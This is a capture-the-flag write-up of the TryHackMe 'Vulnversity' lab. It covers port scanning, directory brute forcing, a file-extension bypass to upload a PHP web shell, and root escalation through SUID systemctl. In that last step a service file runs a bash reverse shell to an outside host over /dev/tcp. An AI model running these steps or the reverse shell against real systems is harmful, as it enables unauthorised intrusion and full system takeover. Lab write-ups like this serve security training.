# TryHackMe - Vulnversity

Learn about active recon, web app attacks and privilege escalation.

## Skills Learned

- Port Scanning
- Web enumeration
- File Upload Restriction Bypass
- Privilege Escalation via sudo

# Tasks

## Reconnaissance 

Reconnaissance is act of gathering information about the target. 

### Nmap

Port scan with nmap

![1d1166f1df36477c0481153e9b4b496d.png](_resources/5c6bb67840e94c87befa6cc5c0fc7c54.png)

Scan through all port

```bash
nmap -p- --min-rate 1000 -oN all-port 10.10.231.160 -v
```

![ca10d8e44625cef38ea6be3a16f8f849.png](_resources/ae01612d2a3b470aadec519e84617b87.png)

Determine each service version

```bash
nmap -p21,22,139,445,3128,3333 -sC -sV -oN all-port-scan 10.10.231.160 -v
```

## Locating directories using GoBuster 

### Directory Brute Force - Gobuster

Perform a directory brute force

```bash
gobuster dir -u http://10.10.231.160:3333 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o discovered.txt
```

![98f7337b2a06c617531d63f87e6932c4.png](_resources/2e97316d8e33467990e0e2b516911f72.png)



## Compromise the webserver 

### Fuzzing Allowed File Extension

Failed upon uploading a web shell to `http://machine_ip:3333/internal/index.php`, extension is not allowed

![38103265ff226ec22d1af4e27add68ed.png](_resources/6f92a893665c40b4ae99df6a52a50b7d.png)

Fuzzing the file extension with BurpSuite

![9bba3d03abb99098428a6c7039553cee.png](_resources/aee12aca45e341c6a092853c79df5d41.png)

Used wordlist

![6ef65443dd45b444d2c09f3ba0b36d8e.png](_resources/7242d06ca3af4558b4232e20a4be0125.png)

One of the results shows different length.

![4a64d3a359f0ef4e0e1213ca9265c9c0.png](_resources/52cc839834f649af8f7c38273fd7d915.png)

Reuploading the web shell with newer extension, `phtml`

![2ec6da3c8767e4b27c51220bbfb258b7.png](_resources/7d355abc6f1446f8bcfe8cc79727e54b.png)

Determine upload location with directory bruteforce using `gobuster`

![dc84ba97630550ba19ce63add027292b.png](_resources/88eb323f28c849dd9ca4a8c3ba2f013a.png)

The upload directory located on `http://machine_ip:3333/internal/uploads/`  

![96fd6d16bf89b38f5435323d0eb0d633.png](_resources/d02e322229e44537b3063ac0ab2138f3.png)

Accessing the web shell returns a reverse shell.

![7ee43fbc3e31fd11c31a6064202e339f.png](_resources/57aad1e798cb4d95b2c393acd01021f6.png)

## Privilege Escalation

Privilege escalation is act of searching potential vector such as exploit bugs, system flaws, or abusing misconfiguration to gain higher privileges (root or administrator) 

There are two types of privilege escalation:

- Horizontal Privilege Escalation, user level to another user
- Vertical Privilege Escalation, user level to super user (root/admin/system)

### Privilege Escalation with SUID binary - systemctl

> SUID (set owner userId upon execution)

The **find** command can be used to find binary with SUID bit

```bash
$ find / -type f -perm -u=s 2>/dev/null | grep -v proc
```

`systemctl` is a utility for managing system and service in Linux. With SUID bit set, it offers a potential [privesc](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) vector.

![c4c2fcba4ad579ba0f626340da39067d.png](_resources/d52a2f3ed3c4435abd3fc35544d011ae.png)


Steps:

1. Create a root.service

   ```bash
   [Unit]
   Description=im groot
   
   [Service]
   Type=simple
   User=root
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9000 0>&1'
   
   [Install]
   WantedBy=multi-user.target
   ```

2. Host and download it on the target

   ![66a4d593472f33fe22893f5e5b4ef4fc.png](_resources/e890907bf17345f9b4f042b19a7ae1c7.png)

   ![f80d5024437848823cd690f666c70784.png](_resources/49c3b280e284446da2ff3f840332d417.png)

3. Enable root.service and start service

   ```bash
   $ /bin/systemctl enable /dev/shm/root.service
   $ /bin/systemctl start root
   ```

4. Check the listener

![ff7d4260e110a28da6f630dd3bc15cf9.png](_resources/0bed6439af0d4a64a1ad6f3bc63b3267.png)